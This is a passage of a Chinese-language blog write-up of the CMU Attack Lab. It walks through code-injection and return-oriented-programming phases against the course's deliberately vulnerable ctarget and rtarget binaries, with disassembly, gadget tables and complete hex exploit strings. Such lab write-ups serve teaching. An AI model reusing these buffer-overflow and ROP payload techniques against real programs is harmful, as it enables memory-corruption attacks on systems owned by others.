+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000040196e &#60;touch3&#62;:&#10;  40196e:&#9;53                   push   %rbx&#10;  40196f:&#9;48 89 fb             mov    %rdi,%rbx&#10;  401972:&#9;c7 05 60 3b 20 00 03 movl   $0x3,0x203b60(%rip)        # 6054dc &#60;vlevel&#62;&#10;  401979:&#9;00 00 00 &#10;  40197c:&#9;48 89 fe             mov    %rdi,%rsi&#10;  40197f:&#9;8b 3d 5f 3b 20 00    mov    0x203b5f(%rip),%edi        # 6054e4 &#60;cookie&#62;&#10;  401985:&#9;e8 36 ff ff ff       callq  4018c0 &#60;hexmatch&#62;&#10;  40198a:&#9;85 c0                test   %eax,%eax</span><br></pre></td></tr></table></figure>
+<p>可以看到在 <code>0x401985</code> 的时候调用了 <code>hexmatch</code>，所以我们只要在前一句和后一句各设置一个断点，看看缓冲区有没有什么变化（这里稍微改了一下第二阶段的字节码用作测试）</p>
+<p><img src="/images/before.jpg" alt="调用 hexmatch 前"></p>
+<p>可以看到在调用 <code>hexmatch</code> 之前我们的缓冲区一切正常，主要留意 <code>0x5560f2f8</code> 这里，保存着我们的 cookie，其他部分其实已经执行了，所以反而无所谓。</p>
+<p><img src="/images/after.jpg" alt="调用 hexmatch 后"></p>
+<p>这就出问题了，我们之前存放在 <code>0x5560f2f8</code> 的传入参数给弄没了，而且可以看到从缓冲区开始 <code>0x5560f2d8</code> 到缓冲区结束 <code>0x5560f300</code> 都不安全。所以我们得给字符串找个新家，不会被覆盖的新家。</p>
+<p>仔细观察 <code>0x5560f308</code> 之后的内容，在 <code>0x00401f94</code> 之后有几个空位置，刚好放得下我们的字符串。为了保证格式的一致，我们需要溢出到 <code>0x5560f318</code> 的位置（当然前一个也可以，不过我选择的位置换行了，比较容易看）</p>
+<p>于是我们需要输入的字符串是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span> d8 f2 <span class="number">60</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">94</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
+<p>至于这个怎么来的，其实是和第二阶段类似的过程，对应的汇编指令为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5560f318,%rdi # mov the cookie string address to parameter&#10;push $0x40196e #push touch3 address&#10;ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c p3.s</span><br><span class="line">objdump <span class="operator">-d</span> p3.o &gt; p3.byte</span><br></pre></td></tr></table></figure>
+<p>得到 p3.byte 文件的内容是（其实我没做这一步，直接改第二阶段的代码也可以，因为逻辑都一样的）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p3.o</span>: <span class="string">    file format elf64-x86-64</span></span><br><span class="line"></span><br><span class="line"><span class="cpp">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 <span class="number">18</span> f3 <span class="number">60</span> <span class="number">55</span> mov    $<span class="number">0x5560f318</span>,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> <span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span>       pushq  $<span class="number">0x40196e</span></span><br><span class="line">   c:	c3                   retq</span></span><br></pre></td></tr></table></figure>
+<p>然后我们就可以转换成机器码 <code>./hex2raw &lt; p3.txt &gt; p3r.txt</code> ，接着执行命令 <code>./ctarget -i p3r.txt</code> 即可看到结果：</p>
+<p><img src="/images/14554578745816.jpg" alt=""></p>
+<h2 id="u7B2C_u56DB_u9636_u6BB5"><a href="#u7B2C_u56DB_u9636_u6BB5" class="headerlink" title="第四阶段"></a>第四阶段</h2><p>从前面我们可以知道，有缓冲区加上缓冲区的代码可以执行使得程序非常容易被攻击，但是在 <code>rtarget</code> 中使用了两个技术来防止这种攻击：</p>
+<ul>
+<li>每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址</li>
+<li>即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误</li>
+</ul>
+<p>那么现在怎么办呢？可以利用已有的可执行的代码，来完成我们的操作，称为 retrun-oriented programming(ROP)，策略就是找到现存代码中的若干条指令，这些指令后面跟着指令 <code>ret</code>，如下图所示</p>
+<p><img src="/images/14554587074206.jpg" alt=""></p>
+<p>每次 return 相当于从一个 gadget 跳转到另一个 gadget 中，然后通过这样不断跳转来完成我们想要的操作。举个具体的例子，假设程序中有一个像下面这样的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这么看起来没啥用，但是看看对应的汇编代码，可能就是另一个感觉：</p>
+<p><img src="/images/14554590163903.jpg" alt=""></p>
+<p>这里 <code>48 89 c7</code> 就编码了 <code>movq %rax, %rdi</code> 指令（参加后面的表格），后面跟着一个 <code>c3</code>（也就是返回），于是这段代码就包含一个 gadget，起始地址是 <code>0x400f18</code>，我们就可以利用这个来做一些事情了。</p>
+<p>这个阶段我们需要重复之前第二阶段的工作，但是因为程序的限制，只能另辟蹊径了，这里我们只需要利用下表给出的指令类型，以及前八个寄存器(<code>%rax - %rdi</code>)。表格如下：</p>
+<p><img src="/images/14554593555844.jpg" alt=""></p>
+<p><img src="/images/14554593658395.jpg" alt=""></p>
+<p><img src="/images/14554593790251.jpg" alt=""></p>
+<p>注意这里的内容都是 16 进制。另外两个指令是：</p>
+<ul>
+<li><code>ret</code>: 一个字节编码 <code>0xc3</code></li>
+<li><code>nop</code>: 什么都不做，只是让程序计数器加一，一个字节编码 <code>0x90</code></li>
+</ul>
+<p>我们先把 <code>rtarget</code> 反编译：<code>objdump -d rtarget &gt; rtarget.txt</code> 并传到本地方便查看 <code>scp dawang@shark.ics.cs.cmu.edu:~/513/target334/rtarget.txt ./</code></p>
+<p>根据前面的思路，我们大概要做的有三步：</p>
+<ol>
+<li>把 cookie 给搞到 <code>%rdi</code> 中</li>
+<li>把 <code>touch2</code> 的地址放入栈中</li>
+<li><code>rtn</code> 以开始执行</li>
+</ol>
+<p>后面两步不算太难，我们来看看第一步怎么搞。给我们找寻线索的函数有：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a0d:   c3                      retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e:   b8 48 88 c7 c3          mov    $0xc3c78848,%eax&#10;  401a13:   c3                      retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14:   8d 87 58 94 90 90       lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a:   c3                      retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b:   8d 87 66 58 90 c3       lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21:   c3                      retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22:   8d 87 58 c3 50 83       lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28:   c3                      retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29:   b8 5b 48 89 c7          mov    $0xc789485b,%eax&#10;  401a2e:   c3                      retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f:   b8 41 48 89 c7          mov    $0xc7894841,%eax&#10;  401a34:   c3                      retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35:   c7 07 49 89 c7 c3       movl   $0xc3c78949,(%rdi)&#10;  401a3b:   c3                      retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c:   b8 8c fa 58 c1          mov    $0xc158fa8c,%eax&#10;  401a41:   c3                      retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42:   b8 01 00 00 00          mov    $0x1,%eax&#10;  401a47:   c3                      retq</span><br></pre></td></tr></table></figure>
+<p>结合上表，我们想要插入一个数字，肯定需要 <code>popq</code> 指令，对应下来就是 <code>58 - 5f</code> 这个范围，因为 ROP 的缘故，我们还需要后面有个 <code>c3</code>，经过搜索，可以看到在 <code>addval_104</code> 中，有一段 <code>58 c3</code>，也就是把栈中的值弹入到 <code>%rax</code> 中，记住这个地址 <code>0x401a24</code>。</p>
+<p>现在我们要做的就是把存放在 <code>%rax</code> 的值放到 <code>%rdi</code> 中，因为这样才能当做参数传给 <code>touch2</code> 函数。根据表里的内容，继续找，这次的目标是 <code>48 89 c7</code>，也就是 <code>movq %rax, %rdi</code>，很幸运，又在 <code>getval_341</code> 中找到了，后面还正好跟了个 <code>c3</code>，赶紧记下这个地址 <code>0x401a2b</code>。</p>
+<p>接下来我们就可以凑 ROP 程序了，下面是栈顶，上面是栈底。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">0x00401860 (最后是 touch2 的入口地址，进行调用)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a2b (把 %rax 的值放入到 %rdi 中，作为参数) -&gt; gadget 2</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x45374fee (我的 cookie，会被 gadget 1 存入到 %rax 中)</span><br><span class="line">-------</span></span><br><span class="line"><span class="header">0x00401a24 (旧的返回地址会被这里覆盖) -&gt; gadget 1</span><br><span class="line">-------</span></span><br><span class="line"><span class="code">....</span><br><span class="line">buf (缓冲区，这里随便写点啥都可以，反正都不能执行)</span><br><span class="line">-------</span></span><br></pre></td></tr></table></figure>
+<p>构造出来的字符串就是（little-endian 规则，要反着看）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>然后转换成机器码 <code>./hex2raw &lt; p4.txt &gt; p4r.txt</code>，再执行 <code>./rtarget -i p4r.txt</code></p>
+<p>但是这样居然会遇到段错误，这是我万万没想到的，问题出在哪里呢？我尝试把这四条语句拆开来执行，发现第一句和第四句没问题，但是中间两句有问题。这说明了一个问题，就是某条语句的执行依赖于后面的语句，再联想到这是 64 位的机器，就明白了为什么会出现段错误了，应该在每个语句后面补 0，那么好，修正之后的字符串是</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ee <span class="number">4f</span> <span class="number">37</span> <span class="number">45</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">60</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>再次进行测试，就可以发现任务完成：</p>
+<p><img src="/images/14554791646804.jpg" alt=""></p>
+<h2 id="u7B2C_u4E94_u9636_u6BB5"><a href="#u7B2C_u4E94_u9636_u6BB5" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>接下来到最后一个阶段，其实做的工作是类似的，就是需要把 cookie 转换成 ascii 码通过缓冲区溢出放到栈的某个位置，然后把指向这个字符串的指针放到 <code>%rdi</code> 中，最后调用 <code>touch3</code> 即可。给出的提示是使用 <code>movl</code>（对前四位进行操作）和诸如 <code>andb %al,%al</code> 的指令（只对低2位的部分操作），标准答案中最少需要使用 8 个 gadget。</p>
+<p>所以老规矩，先把 cookie 转换成 ascii 码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x45374fee</span> -&gt; <span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br></pre></td></tr></table></figure>
+<p>然后我们有完整的用来寻找 gadget 的函数库</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a08 &#60;start_farm&#62;:&#10;  401a08: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a0d: c3                    retq   &#10;&#10;0000000000401a0e &#60;getval_440&#62;:&#10;  401a0e: b8 48 88 c7 c3        mov    $0xc3c78848,%eax&#10;  401a13: c3                    retq   &#10;&#10;0000000000401a14 &#60;addval_394&#62;:&#10;  401a14: 8d 87 58 94 90 90     lea    -0x6f6f6ba8(%rdi),%eax&#10;  401a1a: c3                    retq   &#10;&#10;0000000000401a1b &#60;addval_304&#62;:&#10;  401a1b: 8d 87 66 58 90 c3     lea    -0x3c6fa79a(%rdi),%eax&#10;  401a21: c3                    retq   &#10;&#10;0000000000401a22 &#60;addval_104&#62;:&#10;  401a22: 8d 87 58 c3 50 83     lea    -0x7caf3ca8(%rdi),%eax&#10;  401a28: c3                    retq   &#10;&#10;0000000000401a29 &#60;getval_341&#62;:&#10;  401a29: b8 5b 48 89 c7        mov    $0xc789485b,%eax&#10;  401a2e: c3                    retq   &#10;&#10;0000000000401a2f &#60;getval_278&#62;:&#10;  401a2f: b8 41 48 89 c7        mov    $0xc7894841,%eax&#10;  401a34: c3                    retq   &#10;&#10;0000000000401a35 &#60;setval_371&#62;:&#10;  401a35: c7 07 49 89 c7 c3     movl   $0xc3c78949,(%rdi)&#10;  401a3b: c3                    retq   &#10;&#10;0000000000401a3c &#60;getval_313&#62;:&#10;  401a3c: b8 8c fa 58 c1        mov    $0xc158fa8c,%eax&#10;  401a41: c3                    retq   &#10;&#10;0000000000401a42 &#60;mid_farm&#62;:&#10;  401a42: b8 01 00 00 00        mov    $0x1,%eax&#10;  401a47: c3                    retq   &#10;&#10;0000000000401a48 &#60;add_xy&#62;:&#10;  401a48: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax&#10;  401a4c: c3                    retq   &#10;&#10;0000000000401a4d &#60;getval_349&#62;:&#10;  401a4d: b8 89 c1 18 c0        mov    $0xc018c189,%eax&#10;  401a52: c3                    retq   &#10;&#10;0000000000401a53 &#60;addval_166&#62;:&#10;  401a53: 8d 87 48 89 e0 c3     lea    -0x3c1f76b8(%rdi),%eax&#10;  401a59: c3                    retq   &#10;&#10;0000000000401a5a &#60;getval_106&#62;:&#10;  401a5a: b8 89 ca 91 c3        mov    $0xc391ca89,%eax&#10;  401a5f: c3                    retq   &#10;&#10;0000000000401a60 &#60;getval_330&#62;:&#10;  401a60: b8 89 ca a4 db        mov    $0xdba4ca89,%eax&#10;  401a65: c3                    retq   &#10;&#10;0000000000401a66 &#60;addval_260&#62;:&#10;  401a66: 8d 87 89 d6 38 c0     lea    -0x3fc72977(%rdi),%eax&#10;  401a6c: c3                    retq   &#10;&#10;0000000000401a6d &#60;addval_114&#62;:&#10;  401a6d: 8d 87 8d d6 90 90     lea    -0x6f6f2973(%rdi),%eax&#10;  401a73: c3                    retq   &#10;&#10;0000000000401a74 &#60;setval_481&#62;:&#10;  401a74: c7 07 8d c1 90 c3     movl   $0xc390c18d,(%rdi)&#10;  401a7a: c3                    retq   &#10;&#10;0000000000401a7b &#60;setval_470&#62;:&#10;  401a7b: c7 07 89 d6 92 90     movl   $0x9092d689,(%rdi)&#10;  401a81: c3                    retq   &#10;&#10;0000000000401a82 &#60;getval_418&#62;:&#10;  401a82: b8 8a 48 99 e0        mov    $0xe099488a,%eax&#10;  401a87: c3                    retq   &#10;&#10;0000000000401a88 &#60;setval_253&#62;:&#10;  401a88: c7 07 89 d6 08 c9     movl   $0xc908d689,(%rdi)&#10;  401a8e: c3                    retq   &#10;&#10;0000000000401a8f &#60;setval_227&#62;:&#10;  401a8f: c7 07 8b c1 20 db     movl   $0xdb20c18b,(%rdi)&#10;  401a95: c3                    retq   &#10;&#10;0000000000401a96 &#60;setval_110&#62;:&#10;  401a96: c7 07 89 c1 20 c9     movl   $0xc920c189,(%rdi)&#10;  401a9c: c3                    retq   &#10;&#10;0000000000401a9d &#60;setval_309&#62;:&#10;  401a9d: c7 07 d8 4c 89 e0     movl   $0xe0894cd8,(%rdi)&#10;  401aa3: c3                    retq   &#10;&#10;0000000000401aa4 &#60;getval_136&#62;:&#10;  401aa4: b8 89 c1 91 c3        mov    $0xc391c189,%eax&#10;  401aa9: c3                    retq   &#10;&#10;0000000000401aaa &#60;setval_319&#62;:&#10;  401aaa: c7 07 89 d6 91 c3     movl   $0xc391d689,(%rdi)&#10;  401ab0: c3                    retq   &#10;&#10;0000000000401ab1 &#60;addval_193&#62;:&#10;  401ab1: 8d 87 a9 ca 90 c3     lea    -0x3c6f3557(%rdi),%eax&#10;  401ab7: c3                    retq   &#10;&#10;0000000000401ab8 &#60;addval_471&#62;:&#10;  401ab8: 8d 87 89 ca c4 c9     lea    -0x363b3577(%rdi),%eax&#10;  401abe: c3                    retq   &#10;&#10;0000000000401abf &#60;setval_289&#62;:&#10;  401abf: c7 07 89 ca 48 db     movl   $0xdb48ca89,(%rdi)&#10;  401ac5: c3                    retq   &#10;&#10;0000000000401ac6 &#60;addval_482&#62;:&#10;  401ac6: 8d 87 89 ca 38 c0     lea    -0x3fc73577(%rdi),%eax&#10;  401acc: c3                    retq   &#10;&#10;0000000000401acd &#60;addval_125&#62;:&#10;  401acd: 8d 87 08 89 e0 c3     lea    -0x3c1f76f8(%rdi),%eax&#10;  401ad3: c3                    retq   &#10;&#10;0000000000401ad4 &#60;getval_332&#62;:&#10;  401ad4: b8 09 c1 90 c3        mov    $0xc390c109,%eax&#10;  401ad9: c3                    retq   &#10;&#10;0000000000401ada &#60;addval_385&#62;:&#10;  401ada: 8d 87 48 8b e0 90     lea    -0x6f1f74b8(%rdi),%eax&#10;  401ae0: c3                    retq   &#10;&#10;0000000000401ae1 &#60;setval_263&#62;:&#10;  401ae1: c7 07 4c 89 e0 90     movl   $0x90e0894c,(%rdi)&#10;  401ae7: c3                    retq   &#10;&#10;0000000000401ae8 &#60;getval_187&#62;:&#10;  401ae8: b8 4b 89 d6 c1        mov    $0xc1d6894b,%eax&#10;  401aed: c3                    retq   &#10;&#10;0000000000401aee &#60;addval_462&#62;:&#10;  401aee: 8d 87 89 ca c4 d2     lea    -0x2d3b3577(%rdi),%eax&#10;  401af4: c3                    retq   &#10;&#10;0000000000401af5 &#60;getval_109&#62;:&#10;  401af5: b8 c9 c1 90 c3        mov    $0xc390c1c9,%eax&#10;  401afa: c3                    retq   &#10;&#10;0000000000401afb &#60;addval_238&#62;:&#10;  401afb: 8d 87 89 d6 94 d2     lea    -0x2d6b2977(%rdi),%eax&#10;  401b01: c3                    retq   &#10;&#10;0000000000401b02 &#60;setval_404&#62;:&#10;  401b02: c7 07 a9 d6 20 d2     movl   $0xd220d6a9,(%rdi)&#10;  401b08: c3                    retq   &#10;&#10;0000000000401b09 &#60;getval_469&#62;:&#10;  401b09: b8 ad 89 ca 90        mov    $0x90ca89ad,%eax&#10;  401b0e: c3                    retq   &#10;&#10;0000000000401b0f &#60;getval_291&#62;:&#10;  401b0f: b8 03 48 89 e0        mov    $0xe0894803,%eax&#10;  401b14: c3                    retq   &#10;&#10;0000000000401b15 &#60;addval_345&#62;:&#10;  401b15: 8d 87 89 c1 84 d2     lea    -0x2d7b3e77(%rdi),%eax&#10;  401b1b: c3                    retq   &#10;&#10;0000000000401b1c &#60;setval_424&#62;:&#10;  401b1c: c7 07 c4 4c 89 e0     movl   $0xe0894cc4,(%rdi)&#10;  401b22: c3                    retq</span><br></pre></td></tr></table></figure>
+<p>具体描述一个整个思路(感谢 @yaoxiuh)</p>
+<ol>
+<li>拿到 rsp 存着的地址</li>
+<li>(然后把这个地址) + (cookie 在 stack 偏移量) pop 到某个寄存器中</li>
+<li>然后把这个寄存器的值放到 rdi 中</li>
+<li>然后调用 touch3</li>
+<li>cookie 要放到 stack 最后面</li>
+<li>字符串最后加上 <code>\0</code> 也就是 <code>00000000</code> 来标志结束</li>
+</ol>
+<p>从第二步到第三步，因为可用的指令的限制，需要借用不同的寄存器来进行转移跳转，最后完成对 <code>%rdi</code> 的赋值，具体的步骤（在我的这份代码里）</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">栈顶</span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rsp</span>, %<span class="literal">rax</span> <span class="number">48</span> <span class="number">89</span> e0 c3    <span class="number">0x401b11</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line"><span class="keyword">pop</span>  %<span class="literal">rax</span>       <span class="number">58</span> c3          <span class="number">0x401a24</span></span><br><span class="line">constant <span class="number">0x48</span></span><br><span class="line">movl %<span class="literal">eax</span>, %<span class="literal">ecx</span> <span class="number">89</span> c1 <span class="number">20</span> c9 c3 <span class="number">0x401a98</span> (<span class="number">20</span> c9 没有影响)</span><br><span class="line">movl %<span class="literal">ecx</span>, %<span class="literal">edx</span> <span class="number">89</span> ca <span class="number">28</span> c0 c3 <span class="number">0x401ac8</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line">movl %<span class="literal">edx</span>, %<span class="literal">esi</span> <span class="number">89</span> d6 <span class="number">38</span> c0 c3 <span class="number">0x401a68</span> (<span class="number">38</span> c0 没有影响)</span><br><span class="line"><span class="keyword">lea</span>  (%<span class="literal">rdi</span>, %<span class="literal">rsi</span>, <span class="number">1</span>), %<span class="literal">rax</span>     <span class="number">0x401a48</span></span><br><span class="line"><span class="keyword">mov</span>  %<span class="literal">rax</span>, %<span class="literal">rdi</span> <span class="number">48</span> <span class="number">89</span> c7 c3    <span class="number">0x401a2b</span></span><br><span class="line">touch3 的地址</span><br><span class="line">cookie 的字符串</span><br><span class="line">栈底</span><br></pre></td></tr></table></figure>
+<p>对应的十六进制代码为（同样需要注意不全十六位的 0，不然会出段错误），这里还有一个需要注意的地方是偏移量，在执行第一句时，<code>%rsp</code> 已经是指向下一句了（指向的是当前的栈顶，正在执行的语句是不需要考虑的），所以可以数出来，在 cookie 之前一共有 9 条指令，每个 8 byte，所以一共的偏移量是 <code>0x48</code>（十进制的 72）。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">11</span> <span class="number">1</span>b <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">24</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span 